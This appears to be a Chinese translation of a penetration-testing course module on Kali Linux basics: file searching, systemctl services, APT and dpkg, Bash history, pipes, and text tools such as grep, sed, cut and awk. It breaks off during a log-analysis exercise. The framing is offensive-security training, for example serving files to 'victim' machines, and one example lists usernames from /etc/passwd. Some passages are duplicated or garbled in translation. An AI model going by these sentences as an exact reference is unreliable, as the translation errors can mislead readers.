撤销ext3或ext4分区的文件的工具。\nfdisk (8) - 操纵磁盘分区表\nfixparts (8) - MBR分区表修复工具\ngdisk (8) - 交互式GUID分区表（GPT）操纵器\ngparted (8) - 用于操纵磁盘分区的 GNOME 分区编辑器。\n...\n```\n\n清单7 - 使用apropos来寻找描述中含有 “分区 ”的命令\n\n请注意，**apropos** 似乎与 **man -k** 的功能相同；事实上，它们是等同的。\n\n### 列表文件\n\n**ls** 命令在屏幕上打印出一个基本的文件清单。我们可以用各种通配符修改输出结果。**-a** 选项用于显示所有的文件（包括隐藏的文件），**-l** 选项将每个文件显示在单行上，这对自动化非常有用。\n\n```bash\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public Templates Videos\n\nkali@kali:~$ ls /etc/apache2/sites-available/*.conf\n/etc/apache2/sites-available/000-default.conf\n/etc/apache2/sites-available/default-ssl.conf\n\nkali@kali:~$ ls -a1\n.\n..\n.bash_history\n.bashrc\n.cache\n.config\nDesktop\nDocuments\n...\n```\n\n清单8：文件列表\n\n### 左右移动\n\nLinux 不使用 Windows 风格的驱动器字母。相反，所有的文件、文件夹和设备都是根目录的子目录，用 \"/\" 字符表示。我们可以使用 **cd** 命令，在后面加上一个路径，以改变到指定的目录。**pwd** 命令将打印出当前的目录（如果你迷路了，这很有帮助），运行 **cd ~** 将返回到主目录。\n\n```bash\nkali@kali:~$ cd /usr/share/metasploit-framework/\n\nkali@kali:/usr/share/metasploit-framework$ pwd\n/usr/share/metasploit-framework\n\nkali@kali:/usr/share/metasploit-framework$ cd ~\n\nkali@kali:~$ pwd\n/home/kali\n```\n\n清单 9 - 在文件系统中移动\n\n### 创建目录\n\n命令后面跟着一个目录的名称，就可以创建指定的目录。目录名称可以包含空格，但由于我们将在命令行上花费大量的时间，我们将使用连字符或下划线来代替，从而为自己省去很多麻烦。 这些字符将使自动完成（用 `Tab` 键执行）更容易完成。\n\n```bash\nkali@kali:~$ mkdir notes\n\nkali@kali:~$ cd notes/\n\nkali@kali:~/notes$ mkdir module one\n\nkali@kali:~/notes$ ls\nmodule one\n\nkali@kali:~/notes$ rm -rf module/ one/\n\nkali@kali:~/notes$ mkdir \"module one\"\n\nkali@kali:~/notes$ cd module\\\\ one/\n\nkali@kali:~/notes/module one$\n```\n\n清单10 - 在Kali中创建目录\n\n我们可以用非常有用的 **mkdir -p** 一次创建多个目录，它也会创建任何需要的父目录。这可以与括号扩展相结合，有效地创建一个目录结构，例如，存储你的渗透测试笔记。在下面的例子中，我们创建了一个名为 **test** 的目录，并在该目录中创建了三个子目录，名为 **recon**、**exploit** 和 **report**。\n\n```bash\nkali@kali:~$ mkdir -p test/{recon,exploit,report}\n\nkali@kali:~$ ls -1 test/\nexploit\nrecon\nreport\n```\n\n清单11 - 创建一个目录结构\n\n## 在 Kali Linux 中寻找文件\n\n在 kali 中，有三个最常用的查找文件的方式，find、locate 还有 which。这些工具有相似之处，但工作和返回数据的方式不同，因此可以在不同的情况下使用\n\n### Which\n\n**which** $^{39}$命令在 $PATH 环境变量中定义的目录中搜索指定的文件名。这个变量包含了 kali 在发布命令时搜索的目录清单，而不包含路径。如果找到一个匹配的，**which** 会返回文件的完整路径，如下所示。\n\n```bash\nkali@kali:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nkali@kali:~$ which sbd\n/usr/bin/sbd\n```\n\n清单12 - 探索 which 命令\n\n### Locate\n\nlocate $^{40}$命令是在 kali 中查找文件和目录位置的最快捷方式。为了提供更短的搜索时间，**locate** 搜索一个名为 **locate.db** 的内置数据库，而不是整个硬盘本身。这个数据库是由 cron 调度程序定期自动更新。要手动更新 **locate.db** 数据库，你可以使用 **updatedb** 命令。\n\n```bash\nkali@kali:~$ sudo updatedb\n\nkali@kali:~$ locate sbd.exe\n/usr/share/windows-resources/sbd/sbd.exe\n```\n\n清单13 - 探索 locate 命令\n\n### Find\n\nfind $^{41}$命令是这三个工具中最复杂和最灵活的搜索工具。掌握它的语法有时会很棘手，但它的能力超出了普通的文件搜索。**find** 命令的最基本用法如清单所示，我们从跟文件系统目录开始进行递归搜索，寻找任何以字母 “sbd” 开头的文件。\n\n```bash\nkali@kali:~$ sudo find / -name sbd*\n/usr/bin/sbd\n/usr/share/doc/sbd\n/usr/share/windows-resources/sbd\n/usr/share/windows-resources/sbd/sbd.exe\n/usr/share/windows-resources/sbd/sbdbg.exe\n/var/cache/apt/archives/sbd_1.37-1kali3_amd64.deb\n/var/lib/dpkg/info/sbd.md5sums\n/var/lib/dpkg/info/sbd.list\n```\n\n清单14 - 探索 find 命令\n\n与 locate 相比，find 的主要优点是它可以通过不仅仅是名称来搜索文件和目录。通过 find，我可以按文件年龄、大小、所有者、文件类型、时间戳、权限等进行搜索。$^{42}$\n\n### 练习\n\n1. 使用 **man** 查看你喜欢的一个命令的 man 页。\n2. 使用 **man** 查找与文件压缩有关的关键词。\n3. 使用 **which** 查找你的 Kali 虚拟机上的 **pwd** 命令。\n4. 使用 **locate** 在你的 Kali 虚拟机上找到 **wce32.exe**。\n5. 使用 **find** 来识别任何在过去一天中修改过的、不属于 root 用户的文件（不是目录），并对它们执行 **ls -l**。不允许使用链式/管道式命令!\n\n## 管理 Linux Kali 服务\n\n### SSH 服务\n\n安全服务器（SSH）服务最常用于远程访问计算机，使用安全、加密的协议。SSH 服务是基于 TCP 的，默认监听端口为 22。要在 Kali 中启动 SSH 服务，我们要运行 systemctl，在启动选项后面加上服务名称（本例中为ssh）。\n\n```bash\nkali@kali:~$ sudo systemctl start ssh\n```\n\n当命令成功完成后，它没有返回任何输出，但我们可以通过使用 ss 命令和管道将输出输入到 grep 搜索 “sshd” 来验证 SSH 服务正在运行并在 TCP 端口 22 上监听。输出到 grep 中搜索 “sshd”。\n\n```bash\nkali@kali:~$ sudo ss -antlp | grep sshd\nLISTEN 0      128             [::]:22           [::]:*    users:((\"sshd\",pid=470,fd=4))\nLISTEN 0      128            [::1]:6010         [::]:*    users:((\"sshd\",pid=1397352,fd=10))\n```\n\n如果我们想让 SSH 服务在启动时自动启动（就像许多用户喜欢的那样），我们只需使用 systemctl 命令来启用它。但是，一定要先修改默认密码！\n\n```bash\nkali@kali:~$ sudo systemctl enable ssh\nSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd Executing: /lib/systemd/systemd-sysv-install enable ssh \nCreated symlink /etc/systemd/system/sshd.service → /lib/systemd/system/ssh.service.\n```\n\n我们可以使用 systemctl 来启用和停用 Kali Linux 中的大多数服务。\n\n### HTTP 服务\n\n在渗透测试中，Apache HTTP 服务经常被使用，要么用于托管网站，要么提供一个平台将文件下载到受害者的机器。HTTP 服务是基于 TCP 的，默认监听端口为 80。要在 Kali 中启动 HTTP 服务，我们可以使用 systemctl，就像我们在启动 SSH 服务时一样。来启动 HTTP 服务，我们可以像启动 SSH 服务那样使用 systemctl，将服务名称替换为 “apache2”。\n\n```bash\nkali@kali:~$ sudo systemctl start apache2\n```\n\n和 SSH 服务一样，我们可以用 ss 和 grep 命令来验证 HTTP 服务是否正在运行并监听 TCP 端口 80 上运行并监听，使用 ss 和 grep 命令。\n\n```bash\nkali@kali:~$ sudo ss -antlp | grep apache\nLISTEN 0      128             :::80           :::*    users:((\"apache2\",pid=1481,fd=4),(\"apache2\",pid=1480,fd=4),(\"apache2\",pid=1479,fd=4),(\"apache2\",pid=1478,fd=4),(\"apache2\",pid=1477,fd=4),(\"apache2\",pid=1476,fd=4),(\"apache2\",pid=1475,fd=4))\n```\n\n为了让 HTTP 服务在启动时启动，就像 SSH 服务一样，我们需要明确的启用它，并使用 systemctl 的 enable 选项。\n\n```bash\nkali@kali:~$ sudo systemctl enable apache2\nSynchronizing state of apache2.service with SysV service script with /lib/systemd/syst Executing: /lib/systemd/systemd-sysv-install enable apache2\n```\n\nKali Linux 中大多数服务的操作方式与 SSH 和 HTTP 基本相同，都是通过其服务或 init 脚本。要查看所有可用服务的表格，请运行 systemctl 的 list-unitfiles 选项。\n\n```bash\nkali@kali:~$ systemctl list-unit-files\n...\nUNIT FILE\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t                        STATE\nproc-sys-fs-binfmt_misc.automount \t\t\t\t\t\t                 \t\t\t\t\tstatic\n-.mount \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t               \t\t\t\t\tgenerated\ndev-hugepages.mount \t\t\t\t\t\t\t\t\t\t\t\t\t\t               \t\t\t\t\tstatic\ndev-mqueue.mount                                               \t\t\t\t\tstatic\nmedia-cdrom0.mount                                             \t\t\t\t\tgenerated\nproc-sys-fs-binfmt_misc.mount  \t\t\t\t\t\t                    \t\t\t\t\tstatic\nrun-vmblock\\\\x2dfuse.mount  \t\t\t\t\t\t                 \t\t        \t\t\tdisabled\nsys-fs-fuse-connections.mount  \t\t\t\t\t\t                 \t\t\t\t\t    static\nsys-kernel-config.mount  \t\t\t\t\t\t                 \t\t\t\t\t          static\nsys-kernel-debug.mount  \t\t\t\t\t\t                 \t\t\t\t\t          static\n...\n```\n\n## 搜索、安装和删除工具\n\nKali VMware 镜像包含了渗透测试领域中最常用的工具。然而，在 VMware 镜像中包含 Kali 资源库中存在的每一个工具中是不现实的。因此，我们需要讨论如何搜索、安装或删除工具。在本节中，我们将探讨高级软件包工具（APT）工具集以及其他在 Kali Linux 操作系统上进行维护操作时有用的命令。APT 是一套帮助管理软件包或应用程序的工具，在基于 Debian 的系统中。由于 Kali 时基于 Debian 的，我们可以使用 APT 来安装和删除应用程序，更新软件包，甚至升级整个系统。APT 的神奇之处在于它是一个完整的软件包管理系统，通过递归地满足其要求和依赖关系来安装或删除所要求的软件包。\n\n### Apt update\n\n有关 APT 软件包的信息被缓存在本地，以加快任何涉及查询 APT 数据库的操作。因此，更新可用软件包的列表，包括与它们的版本、描述等有关的信息，始终是一个好的做法。包的列表，包括与它们的版本、描述等相关的信息。我们可以用 apt update 命令来做这件事，如下所示：\n\n```bash\nkali@kali:~$ sudo apt update\nHit:1 <http://kali.mirror.globo.tech/kali> kali-rolling InRelease\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\n699 packages can be upgraded. Run 'apt list --upgradable' to see them.\n```\n\n### Apt upgrade\n\n在 APT 数据库被更新后，我们可以使用 apt upgrade 命令将已安装的软件包和核心系统升级到最新的版本。\n\n为了升级单个软件包，在 apt upgrade 命令后面加上软件包的名字。例如 apt upgrade metasploit-framework。\n\n<aside> 💡 虽然你可以在任何时候升级你的Kali Linux安装，但最好的办法是 在这样做之前，最好先在一个干净的状态下对虚拟机进行快照（在做任何改变之前 之前）进行快照。这有两个主要好处。首先，它将 确保你有一个经过测试的构建的快照，可以用于所有的练习 其次，如果你遇到问题而不得不联系我们的支持团队，他们会 他们会知道你所使用的工具的版本以及它们的行为方式。对于一个实际的 渗透测试，这些问题也同样适用。你将了解更多关于如何 如何在拥有最新的工具和值得信赖的构建之间取得平衡，因为你会获得更多的 经验和对Kali Linux的熟悉程度。\n\n</aside>\n\n### Apt-cache search 和 apt show\n\napt-cache 搜索命令显示了存储在内部缓存的软件包数据中的大部分信息。例如，假设我们想通过 APT 安装 pure-ftpd 应用程序。我们要做的第一件事是找出该应用程序是否存在于 kali Linux 的仓库中。要做到这一点，我们将在命令行中传递搜索词。\n\n```bash\nkali@kali:~$ apt-cache search pure-ftpd\nmysqmail-pure-ftpd-logger - real-time logging system in MySQL - Pure-FTPd traffic-logg\npure-ftpd - Secure and efficient FTP server\npure-ftpd-common - Pure-FTPd FTP server (Common Files)\npure-ftpd-ldap - Secure and efficient FTP server with LDAP user authentication\npure-ftpd-mysql - Secure and efficient FTP server with MySQL user authentication\npure-ftpd-postgresql - Secure and efficient FTP server with PostgreSQL user authentica\nresource-agents - Cluster Resource Agents\n```\n\n上面的输出表明，该应用程序存在于版本库中。也有一些 pure-ftpd 应用程序的认证扩展，如果需要，可以安装。\n\n有趣的是，资源代理包在我们的搜索中出现了，尽管其名称不包含 \"pure-ftpd \"关键字。这背后的原因是，apt-cache 搜索会在软件包的描述中寻找所需的关键词，而不是在软件包的名称本身。\n\n为了确认 resource-agents 软件包的描述确实包含 \"pure-ftpd \"这个关键词。将软件包的名称传递给 apt show，如下所示。\n\n```bash\nkali@kali:~$ apt show resource-agents\nPackage: resource-agents\nVersion: 1:4.2.0-2\n...\nDescription: Cluster Resource Agents\nThis package contains cluster resource agents (RAs) compliant with the Open\nCluster Framework (OCF) specification, used to interface with various services\nin a High Availability environment managed by the Pacemaker resource manager.\n.\nAgents included:\n AoEtarget: Manages ATA-over-Ethernet (AoE) target exports\n AudibleAlarm: Emits audible beeps at a configurable interval\n ...\n NodeUtilization: Node Utilization\n Pure-FTPd: Manages a Pure-FTPd FTP server instance\n Raid1: Manages Linux software RAID (MD) devices on shared storage\n ...\n```\n\n在上面的输出中，apt show 澄清了为什么资源代理程序在之前搜索 pure-ftpd 时神秘地显示出来。\n\n### Apt install\n\napt install 命令可以用来将一个软件包添加到系统中，用 apt install 后面跟着软件包的名字。让我们继续安装 pure-ftpd。\n\n```bash\nkali@kali:~$ sudo apt install pure-ftpd\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\n pure-ftpd-common\nThe following NEW packages will be installed:\n pure-ftpd pure-ftpd-common\n0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 309 kB of archives.\nAfter this operation, 880 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nGet:1 <http://kali.mirror.globo.tech/kali> kali-rolling/main amd64 pure-ftpd-common all\nGet:2 <http://kali.mirror.globo.tech/kali> kali-rolling/main amd64 pure-ftpd amd64 1.0.4\nFetched 309 kB in 4s (86.4 kB/s)\nPreconfiguring packages ...\n...\n```\n\n同样地，我们可以用 apt remove --purge命令删除一个软件包。\n\n### Apt remove --purge\n\napt remove -purge 命令可以完全删除 Kali 中的软件包。需要注意的是，用 apt remove 删除软件包会删除所有的软件包数据，但通常会留下小的（修改过的）用户配置文件，以防删除是意外的。添加 --purge 选项可以删除所有遗留物。\n\n```bash\nkali@kali:~$ sudo apt remove --purge pure-ftpd\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following package was automatically installed and is no longer required:\n pure-ftpd-common\nUse 'sudo apt autoremove' to remove it.\nThe following packages will be REMOVED:\n pure-ftpd*\n0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.\nAfter this operation, 581 kB disk space will be freed.\nDo you want to continue? [Y/n] y\n(Reading database ... 388024 files and directories currently installed.)\nRemoving pure-ftpd (1.0.47-3) ...\nCannot find cached rlinetd's config files for service ftp, ignoring remove request\nProcessing triggers for man-db (2.8.5-2) ...\n(Reading database ... 388011 files and directories currently installed.)\nPurging configuration files for pure-ftpd (1.0.47-3) ...\nProcessing triggers for systemd (240-6) ...\n```\n\n### Dpkg\n\ndpkg 是用于安装软件包的核心工具，可以直接或间接地通过 APT 安装。它也是离线操作时使用的首选工具，因为它不需要互联网连接。注意，dpkg 不会安装软件包可能需要的任何依赖项。要用 dpkg 安装一个软件包，请提供 -i 或 --install 选项和 .deb 包文件的路径。这假定要安装的软件包的 .deb 文件已经被下载或通过其他方式获得。\n\n```bash\nkali@kali:~$ sudo dpkg -i man-db_2.7.0.2-5_amd64.deb\n(Reading database ... 86425 files and directories currently installed.)\nPreparing to unpack man-db_2.7.0.2-5_amd64.deb ...\nUnpacking man-db (2.7.0.2-5) over (2.7.0.2-4) ...\nSetting up man-db (2.7.0.2-5) ...\nUpdating database of manual pages ...\nProcessing triggers for mime-support (3.58) ...\n...\n```\n\n### 练习\n\n(这些练习不需要报告)\n\n1. 对你的Kali虚拟机进行快照（可选）。\n2. 搜索一个当前没有安装在Kali中的工具。\n3. 安装该工具。\n4. 移除该工具。\n5. 将Kali虚拟机恢复到之前拍摄的快照（可选）。\n\n## 结束语\n\n在这个模块中，我们为即将到来的模块设定了一个基线。我们探讨了新用户的技巧和窍门，并回顾了一些高级用户可能会欣赏的标准。\n\n我们鼓励所有学生回顾Kali培训网站上的免费在线培训$^{46}$。这个网站包括 Kali Linux Revealed 一书，旨在测试你的理解的练习，一个专门的支持论坛，以及更多。这些免费资源为所有技能水平的用户提供了有价值的见解，是本课程培训的一个很好的补充。\n\n# 命令行的乐趣\n\n## Bash 环境\n\nBash 是一个与 sh 兼容的shell，它允许我们在终端窗口中运行复杂的命令并执行不同的任务。它整合了 KornShell(ksh) 和 C shell(csh) 的有用功能。\n\n### 环境变量\n\n当打开一个终端窗口时，一个新的 Bash 进程，它有自己的环境变量，被初始化。这些变量是一种全局存储形式，用于存储在终端会话中运行的任何在该终端会话中运行的应用程序所继承的各种设置。其中一个最常被引用的环境变量之一是 PATH，它是一个用冒号分隔的目录路径列表，Bash 会在没有命令的情况下搜索这些目录。Bash 会在运行没有完整路径的命令时搜索这些目录。我们可以用 echo 命令查看一个特定的环境变量的内容，在该命令后面加上 和一个环境变量的名字。例如，让我们看一下 PATH 环境变量的内容。\n\n```bash\nkali@kali:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n\n其他一些有用的环境变量包括 USER、PWD 和 HOME。终端用户的用户名、当前工作目录和主目录。\n\n```bash\nkali@kali:~$ echo $USER\nkali\n\nkali@kali:~$ echo $PWD\n/home/kali\n\nkali@kali:~$ echo $HOME\n/home/kali\n```\n\n一个环境变量可以用 export 命令来定义。例如，如果我们正在扫描一个目标，不想重复输入系统的 IP 地址，我们可以快速地赋予它一个环境变量并使用它来代替。\n\n```bash\nkali@kali:~$ export b=10.11.1.220\n\nkali@kali:~$ ping -c 2 $b\nPING 10.11.1.220 (10.11.1.220) 56(84) bytes of data.\n64 bytes from 10.11.1.220: icmp_seq=1 ttl=62 time=2.23 ms\n64 bytes from 10.11.1.220: icmp_seq=2 ttl=62 time=1.56 ms\n\n--- 10.11.1.220 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1002ms\nrtt min/avg/max/mdev = 1.563/1.900/2.238/0.340 ms\n```\n\nexport 命令使得我们可能从当前的 Bash 实例中产生的任何子进程都可以访问该变量。如果我们在没有导出的情况下设置一个环境变量，它将只在当前的 shell 中可用。我们将使用 $$ 变量来显示当前 shell 实例的进程 ID，以确保我们确实是在两个不同的 shell 中发布命令。\n\n```bash\nkali@kali:~$ echo \"$$\"\n1827\n\nkali@kali:~$ var=\"My Var\"\n\nkali@kali:~$ echo $var\nMy Var\n\nkali@kali:~$ bash\n\nkali@kali:~$ echo \"$$\"\n1908\n\nkali@kali:~$ echo $var\n\nkali@kali:~$ exit\nexit\n\nkali@kali:~$ echo $var\nMy Var\n\nkali@kali:~$ export othervar=\"Global Var\"\n\nkali@kali:~$ echo $othervar\nGlobal Var\n\nkali@kali:~$ bash\n\nkali@kali:~$ echo $othervar\nGlobal Var\n\nkali@kali:~$ exit\nexit\nkali@kali:~$\n```\n\n在 Kali Linux 中还有许多其他默认定义的环境变量。我们可以通过在命令行运行 env 来查看这些变量。\n\n```bash\nkali@kali:~$ env\nSHELL=/bin/bash\n...\nPWD=/home/kali\nXDG_SESSION_DESKTOP=lightdm-xsession\nLOGNAME=kali\nXDG_SESSION_TYPE=x11\nXAUTHORITY=/home/kali/.Xauthority\nXDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali\nHOME=/home/kali\n...\nTERM=xterm-256color\nUSER=k\n```\n\n### Tab 自动补全\n\nBash shell 的自动补全功能允许我们用 `TAB` 来完成文件名和目录路径。`TAB` 键来完成文件名和目录路径。这个功能大大加速了 shell 的使用，以至于在其他 shell 中被严重遗漏。让我们在 kali 用户的主目录下看看它是如何工作的。我们首先输入以下命令。\n\n```bash\nkali@kali:~$ ls D[TAB]\nDesktop/ Documents/ Downloads/\n\nkali@kali:~$ ls De[TAB]sktop/\n\nkali@kali:~$ ls Desktop/\n```\n\n当我们在 \"D\" 后面第一次按 `TAB` 键时，Bash shell 提示有三个以该字母开头的目录，然后显示我们部分完成的命令，让我们继续。由于我们决定指定 \"Desktop\"，我们接着第二次输入 \"e\"，然后按 `TAB`键。在这一点上，Bash shell 神奇地自动完成了 \"Desktop\" 这个词的其余部分，因为这是唯一以 \"De\" 开头的选项。关于标签完成的其他信息可以在 Debian 网站上找到。\n\n### Bash 历史记录\n\n在进行渗透测试的时候，记录在 Shell 中输入的命令是很重要的。幸运的是，Bash 保留了一个已经输入的命令的历史记录，可以用 history 命令来显示。\n\n```bash\nkali@kali:~$ history\n 1 cat /etc/lsb-release\n 2 clear\n 3 history\n```\n\n与其重新输入历史记录中的长命令，我们还可以利用历史记录的扩展功能。例如，回顾 Listing，历史上有三条命令，每条命令前面都有一个行号。要重新运行第一条命令，我们只需输入 ! 字符和行号，本例中为 1，就可以执行 cat /etc/lsb-release 命令。\n\n```bash\nkali@kali:~$ !1\ncat /etc/lsb-release\nDISTRIB_ID=Kali\nDISTRIB_RELEASE=kali-rolling\nDISTRIB_CODENAME=kali-rolling\nDISTRIB_DESCRIPTION=\"Kali GNU/Linux Rolling\"\n```\n\n另一个有用的历史快捷键是!!，它重复我们在终端会话中执行的最后一条命令。\n\n```bash\nkali@kali:~$ sudo systemctl restart apache2\n\nkali@kali:~$ !!\nsudo systemctl restart apache2\n\nkali@kali:~$\n```\n\n默认情况下，命令历史被保存在用户主目录下的 .bash_history 文件中。有两个环境变量控制历史记录的大小：HISTSIZE 和 HISTFILESIZE。\n\nHISTSIZE 控制当前会话存储在内存中的命令数量，HISTFILESIZE 配置历史文件中保存的命令数量。这些变量可以根据我们的需要进行编辑，并保存在 Bash 配置文件（.bashrc）中。\n\n探索 Bash 历史的一个最简单的方法是直接从命令行提示符中进行。我们可以用一些有用的键盘快捷键来浏览历史记录，其中最常用的有两个：\n\n- `△` 在历史中向后滚动\n- `▽` 在历史中向前滚动\n\n最后，按住 `Ctrl` 键并按 `R` 键将使用反向-i-搜索工具。键入一个字母，例如 ‘c’，会得到一个在历史中包含字母 ‘c’ 的最新命令的匹配。继续输入以缩小匹配范围，当找到所需的命令时，按 `Return` 来执行它。\n\n```bash\nkali@kali:~$ [CTRL-R]c\n(reverse-i-search)`ca': cat /etc/lsb-release\n```\n\n## 管道符和重定向\n\n每个从命令行运行的程序都有三个数据流与之相连，作为与外部环境的通信渠道。这些数据流定义如下：\n\n管道符（使用 `|` 操作符）和重定向（使用 `>` 和 `<` 操作符）在程序和文件之间连接这些流，以适应几乎无限多的可能使用情况。\n\n### 重定向到一个新文件\n\n在前面的命令例子中，输出被打印到屏幕上。这在大多数情况下是很方便的，但是我们可以使用 `>` 操作符将输出保存到一个文件中，以备将来参考或操作。\n\n```bash\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public Templates Videos\n\nkali@kali:~$ echo \"test\"\ntest\n\nkali@kali:~$ echo \"test\" > redirection_test.txt\n\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public redirection_test.txt Template\n\nkali@kali:~$ cat redirection_test.txt\ntest\n\nkali@kali:~$ echo \"Kali Linux is an open source project\" > redirection_test.txt\nkali@kali:~$ cat redirection_test.txt\n\nKali Linux is an open source project\n```\n\n<aside> 💡 如果我们将输出重定向到一个不存在的文件，该文件将被自动创建。然而，如果我们把输出保存到一个已经存在的文件，该文件的内容将被替换。对重定向要小心！没有撤销的功能！\n\n</aside>\n\n### 重定向到一个现有的文件\n\n要将额外的数据附加到一个现有的文件（而不是覆盖该文件），请使用 `>>` 操作符。\n\n```bash\nkali@kali:~$ echo \"that is maintained and funded by Offensive Security\" >>\nredirection_test.txt\nkali@kali:~$ cat redirection_test.txt\nKali Linux is an open source project\nthat is maintained and funded by Offensive Security\n```\n\n### 从一个文件重定向\n\n可以使用 `<` 操作符来发送数他方式”。在下面的例子中，直接用来自上一节中生成的数据重定向 wc 命令的 STDIN。用 wc -m 来计算文件中的字符数试试：\n\n```bash\nkali@kali:~$ wc -m < redirection_test.txt\n89\n```\n\n<aside> 💡 这实际上是将我们的文件内容“连接”到 wc -m 命令的标准输入。\n\n</aside>\n\n### 重定向 STDERR\n\n根据 POSIX 规范，STDIN、STDOU 和 STDERR 的文件描述符分别定义为 0、1 和 2。这些数字很重要，因为在执行或将不同的命令连接在一起时，它们可以用来操作来自命令行的相应数据流。\n\n为了更好的掌握文件描述符数字的工作原理，考虑这个重定向标准错误（STDERR）的例子。\n\n```bash\nkali@kali:~$ ls .\nDesktop Documents Downloads Music Pictures Public redirection_test.txt Template\n\nkali@kali:~$ ls ./test\nls: cannot access '/test': No such file or directory\n\nkali@kali:~$ ls ./test 2>error.txt\n\nkali@kali:~$ cat error.txt\nls: cannot access '/test': No such file or directory\n```\n\n<aside> 💡 error.txt 只包含错误信息（在 STDERR 上生成）。我们通过在 “>” 操作符前加上流编号来做到这一点（2=STDERR）。\n\n</aside>\n\n### 管道符\n\n继续使用 wc 命令的例子，让我们看看如何将一个命令的输出重定向到另一个命令的输入。请看这个例子：\n\n```bash\nkali@kali:~$ cat error.txt\nls: cannot access '/test': No such file or directory\n\nkali@kali:~$ cat error.txt | wc -m\n53\n\nkali@kali:~$ cat error.txt | wc -m > count.txt\n\nkali@kali:~$ cat count.txt\n53\n```\n\n我们使用管道符 `|` 将 cat 命令的输出重定向到 wc 命令的输入。这个概念看起来很微不足道，但将不同的命令用管道连接起来是一个强大的工具，可以操作各种数据。\n\n## 文本搜索和操作\n\n可以通过几个命令来提高文件和文本处理的效率： grep、sed、cut 和 awk。对其中一些工具的高级使用需要对正则匹配式（regex）的工作原理有一个很好的理解。正则表达式是一个特殊的文本字符串，用于描述搜索模式。\n\n正则表达式学习网址：\n\n> https://www.regular-expressions.info/\n\n> http://www.rexegg.com/\n\n### Grep\n\ngrep 搜索文本文件中出现的给定的正则表达式，并将包含匹配结果的任何一行输出到标准输出，这通常是终端屏幕。一些最常用的选项包括用于递归搜索的 `-r` 和用于忽略文本大小写的 `-i` 。例子：\n\n```bash\nkali@kali:~$ ls -la /usr/bin | grep zip\n-rwxr-xr-x 3 root root 34480 Jan 29 2017 bunzip2\n-rwxr-xr-x 3 root root 34480 Jan 29 2017 bzip2\n-rwxr-xr-x 1 root root 13864 Jan 29 2017 bzip2recover\n-rwxr-xr-x 2 root root 2301 Mar 14 2016 gunzip\n-rwxr-xr-x 1 root root 105172 Mar 14 2016 gzip\n```\n\n用 ls 列出了 /usr/bin 目录下的所有文件，并将输出结果输入到 grep 命令，该命令搜索包含了 “zip” 字符串的任何一行。了解 grep 工具以及何时使用它可以证明是非常有用的。\n\n### Sed\n\nsed 是一个强大的流编辑器。它也是非常复杂的，所以我们在这里只简单地介绍一下它的表面。在一个非常高的水平上，sed 在一个文本流上执行文本编辑，可以是一组特定的文件或标准输出。让我们看一个例子：\n\n```bash\nkali@kali:~$ echo \"I need to try hard\" | sed 's/hard/harder/'\nI need to try harder\n```\n\n在列表中，我们用 echo 命令创建了一个文本流，然后将其输出到 sed，以便将 “hard” 替换为 “harder”。注意，在默认情况下，输出已被重定向到标准输出。\n\n### Cut\n\ncut 命令很简单，但经常派上用场。它用于从一行中提取一段文本，并将其输出到标准输出。一些最常用的选项包括： `-f` 表示我们要剪切的字段编号， `-d` 表示字段分隔符。\n\n```bash\nkali@kali:~$ echo \"I hack binaries,web apps,mobile apps, and just about anything else\"| cut -f 2 -d \",\"\nweb apps\n```\n\n我们呼出了一行文本，并将其输送到 cut 命令中，用逗号（,）作为字段分隔符提取第二个字段。同样的命令可以用于文本文件中的行，如下所示，通过使用冒号（:）作为分隔符和检索第一个字段，从 /etc/passwd 中提取了一个用户列表：\n\n```bash\nkali@kali:~$ cut -d \":\" -f 1 /etc/passwd\nroot\ndaemon\nbin\nsys\nsync\ngames\n...\n```\n\n### Awk\n\nawk 是一种为文本处理而设计的编程语言，通常被用作数据提取和报告工具。它的功能也非常强大，可以说是相当复杂，所以我们在这里只介绍一下表面情况。awk 的一个常用选项是： `-F` ，它是字段分隔符，而 print 命令则是输出结果文本。\n\n```bash\nkali@kali:~$ echo \"hello::there::friend\" | awk -F \"::\" '{print $1, $3}'\nhello friend\n```\n\n我们输出了一行，并把它输送给 awk，用 “::” 作为字段分隔符提取第一个 （$1）和第三个（$3）字段。我们使用的 cut 和 awk 例子之间最突出的区别是，cut 只接受一个字符作为字段分隔符，而 awk 则要灵活的都多。作为一个一般的经验法则，当你开始有一个涉及多个剪切操作的命令时，你可能要考虑该用 awk。\n\n### 实例\n\n我们得到了一个 Apache HTTP 服务器日志（http://www.offensive-security.com/pwk-files/access_log.txt.gz），它包含了一个攻击的证据。我们的任务是使用 Bash 命令来检查该文件，并发现各种信息，例如谁是攻击者和服务器上到底发生了什么。\n\n首先，我们将使用 head 和 wc 命令快速浏览一下日志文件，了解其结构。head 命令显示文件中的前10行，而 wc 命令，连同 `-l` 选项，显示文件中的总行数。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gunzip access_log.txt.gz                                                           9 ⨯\n                                                                                           \n┌──(root💀kali)-[~/Desktop]\n└─# mv access_log.txt access.log                   \n                                                                                                                                                                                                                    \n┌──(root💀kali)-[~/Desktop]\n└─# head access.log \n201.21.152.44 - - [25/Apr/2013:14:05:35 -0700] \"GET /favicon.ico HTTP/1.1\" 404 89 \"-\" \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:48 -0700] \"GET /include/jquery.jshowoff.min.js HTTP/1.1\" 200 2553 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like 